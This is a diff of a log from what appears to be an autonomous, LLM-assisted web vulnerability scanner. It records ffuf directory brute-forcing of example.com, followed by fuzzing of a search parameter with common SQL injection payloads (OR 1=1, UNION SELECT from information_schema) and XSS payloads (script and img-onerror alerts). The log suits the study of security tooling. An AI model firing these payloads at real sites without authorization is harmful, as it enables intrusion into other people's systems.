@@ -75,3 +75,73 @@
 2025-05-20 06:12:53,771 - INFO - Generated progress report: workspace/onepeloton.com/agent_progress_report.json
 2025-05-20 06:12:53,773 - INFO - Generated progress report: agent_progress_report.json
 2025-05-20 06:12:53,773 - INFO - Autonomous cycle completed
+2025-05-20 18:46:50,773 - INFO - Starting content discovery for example.com
+2025-05-20 18:46:50,776 - INFO - Found 1 hosts to scan
+2025-05-20 18:46:50,784 - INFO - Using wordlist: /usr/share/wordlists/dirb/common.txt
+2025-05-20 18:46:50,791 - INFO - Running: ffuf -u https://example.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -e php,html,js,txt,json,xml,config,bak,old,backup,sql,env -mc 200,201,202,203,204,301,302,307,401,403,405 -t 10 -recursion -recursion-depth 2 -timeout 30 -o workspace/example.com/content_discovery/example.com_ffuf.json -of json
+2025-05-20 19:20:32,643 - INFO - Completed ffuf scan on https://example.com
+2025-05-20 19:20:32,644 - INFO - Running: httpx -u https://example.com -silent -tech-detect -title -status-code -follow-redirects -no-color -json -o workspace/example.com/content_discovery/example.com_httpx.json
+2025-05-20 19:20:32,861 - ERROR - Error running httpx on https://example.com: Command 'httpx -u https://example.com -silent -tech-detect -title -status-code -follow-redirects -no-color -json -o workspace/example.com/content_discovery/example.com_httpx.json' returned non-zero exit status 2.
+2025-05-20 19:20:43,596 - INFO - Completed vulnerability checks on https://example.com, found 0 potentially interesting endpoints
+2025-05-20 19:20:43,599 - ERROR - Error in AI classification: "Key 'client' not found in LLMConfig"
+2025-05-20 19:20:43,613 - INFO - Saved 2 new endpoints to database
+2025-05-20 19:20:43,620 - INFO - Sending message: 🏆 RESULT [DiscoveryAgent]: discover_endpoints
+2025-05-20 19:20:43,645 - INFO - Content discovery complete for example.com
+2025-05-20 19:20:43,645 - INFO - Found 2 total endpoints, 0 marked as interesting
+2025-05-20 19:20:43,645 - INFO - Received message: 📤 REQUEST [TestAgent → DiscoveryAgent]: discover_endpoints
+2025-05-20 19:20:43,645 - INFO - Starting content discovery for example.com
+2025-05-20 19:20:43,646 - INFO - Found 1 hosts to scan
+2025-05-20 19:20:43,646 - INFO - Using wordlist: /usr/share/wordlists/dirb/common.txt
+2025-05-20 19:20:43,654 - ERROR - Error processing host https://example.com: 'extensions'
+2025-05-20 19:20:43,660 - INFO - Sending message: 🏆 RESULT [DiscoveryAgent]: discover_endpoints
+2025-05-20 19:20:43,684 - INFO - Content discovery complete for example.com
+2025-05-20 19:20:43,684 - INFO - Found 0 total endpoints, 0 marked as interesting
+2025-05-20 19:20:43,685 - ERROR - Error in AI classification: "Key 'client' not found in LLMConfig"
+2025-05-20 19:49:38,224 - INFO - Fuzzing https://example.com/search?q=test for vulnerabilities: sqli, xss
+2025-05-20 19:49:38,637 - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 401 Unauthorized"
+2025-05-20 19:49:38,638 - ERROR - Error generating payloads: Error code: 401 - {'error': {'message': 'Incorrect API key provided: sk-proj-********************************************************************************************************************************************************_NsA. You can find your API key at https://platform.openai.com/account/api-keys.', 'type': 'invalid_request_error', 'param': None, 'code': 'invalid_api_key'}}
+2025-05-20 19:49:38,638 - INFO - Using fallback payload generation
+2025-05-20 19:49:38,638 - INFO - Testing: https://example.com/search?q=' OR '1'='1
+2025-05-20 19:49:39,762 - INFO - Testing: https://example.com/search?q=1' OR '1'='1
+2025-05-20 19:49:40,680 - INFO - Testing: https://example.com/search?q=1 OR 1=1
+2025-05-20 19:49:41,553 - INFO - Testing: https://example.com/search?q=' OR 1=1--
+2025-05-20 19:49:42,487 - INFO - Testing: https://example.com/search?q=admin'--
+2025-05-20 19:49:43,343 - INFO - Testing: https://example.com/search?q=<script>alert(1)</script>
+2025-05-20 19:49:44,227 - INFO - Testing: https://example.com/search?q="><script>alert(1)</script>
+2025-05-20 19:49:45,027 - INFO - Testing: https://example.com/search?q='><script>alert(1)</script>
+2025-05-20 19:49:45,887 - INFO - Testing: https://example.com/search?q=<img src=x onerror=alert(1)>
+2025-05-20 19:49:46,719 - INFO - Testing: https://example.com/search?q=javascript:alert(1)
+2025-05-20 19:49:47,712 - INFO - Received message: 📤 REQUEST [TestAgent → FuzzerAgent]: fuzz_endpoint
+2025-05-20 19:49:47,713 - INFO - Fuzzing https://example.com/search?q=test for vulnerabilities: sqli
+2025-05-20 19:49:47,951 - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 401 Unauthorized"
+2025-05-20 19:49:47,952 - ERROR - Error generating payloads: Error code: 401 - {'error': {'message': 'Incorrect API key provided: sk-proj-********************************************************************************************************************************************************_NsA. You can find your API key at https://platform.openai.com/account/api-keys.', 'type': 'invalid_request_error', 'param': None, 'code': 'invalid_api_key'}}
+2025-05-20 19:49:47,952 - INFO - Using fallback payload generation
+2025-05-20 19:51:47,056 - INFO - Fuzzing https://example.com/search?q=test for vulnerabilities: xss, sqli
+2025-05-20 19:51:47,310 - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 401 Unauthorized"
+2025-05-20 19:51:47,313 - ERROR - Error generating payloads: Error code: 401 - {'error': {'message': 'Incorrect API key provided: sk-proj-********************************************************************************************************************************************************_NsA. You can find your API key at https://platform.openai.com/account/api-keys.', 'type': 'invalid_request_error', 'param': None, 'code': 'invalid_api_key'}}
+2025-05-20 19:51:47,313 - INFO - Using fallback payload generation
+2025-05-20 19:51:47,314 - INFO - Testing: https://example.com/search?q=<script>alert(1)</script>
+2025-05-20 19:51:48,315 - INFO - Testing: https://example.com/search?q="><script>alert(1)</script>
+2025-05-20 19:51:49,210 - INFO - Testing: https://example.com/search?q='><script>alert(1)</script>
+2025-05-20 19:51:50,028 - INFO - Testing: https://example.com/search?q=<img src=x onerror=alert(1)>
+2025-05-20 19:51:50,864 - INFO - Testing: https://example.com/search?q=javascript:alert(1)
+2025-05-20 19:51:51,664 - INFO - Testing: https://example.com/search?q=' OR '1'='1
+2025-05-20 19:51:52,508 - INFO - Testing: https://example.com/search?q=1' OR '1'='1
+2025-05-20 19:51:53,313 - INFO - Testing: https://example.com/search?q=1 OR 1=1
+2025-05-20 19:51:54,134 - INFO - Testing: https://example.com/search?q=' OR 1=1--
+2025-05-20 19:51:54,979 - INFO - Testing: https://example.com/search?q=admin'--
+2025-05-20 19:51:55,859 - INFO - Received message: 📤 REQUEST [TestAgent → FuzzerAgent]: fuzz_endpoint
+2025-05-20 19:51:55,860 - INFO - Fuzzing https://example.com/search?q=test for vulnerabilities: xss
+2025-05-20 19:51:56,156 - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 401 Unauthorized"
+2025-05-20 19:51:56,158 - ERROR - Error generating payloads: Error code: 401 - {'error': {'message': 'Incorrect API key provided: sk-proj-********************************************************************************************************************************************************_NsA. You can find your API key at https://platform.openai.com/account/api-keys.', 'type': 'invalid_request_error', 'param': None, 'code': 'invalid_api_key'}}
+2025-05-20 19:51:56,158 - INFO - Using fallback payload generation
+2025-05-20 19:55:45,608 - INFO - Fuzzing https://example.com/search?q=test for vulnerabilities: sqli, xss
+2025-05-20 19:55:54,005 - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
+2025-05-20 19:55:54,009 - INFO - Generated 3 payloads for https://example.com/search?q=test
+2025-05-20 19:55:54,009 - INFO - Testing: https://example.com/test' OR '1'='1?q=test
+2025-05-20 19:55:55,097 - INFO - Testing: https://example.com/test' UNION SELECT null, table_name FROM information_schema.tables--?q=test
+2025-05-20 19:55:56,780 - INFO - Testing: https://example.com/<script>alert('XSS')</script>?q=test
+2025-05-20 19:55:57,952 - INFO - Received message: 📤 REQUEST [TestAgent → FuzzerAgent]: fuzz_endpoint
+2025-05-20 19:55:57,953 - INFO - Fuzzing https://example.com/search?q=test for vulnerabilities: sqli
+2025-05-20 19:56:01,175 - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
+2025-05-20 19:56:01,177 - INFO - Generated 2 payloads for https://example.com/search?q=test
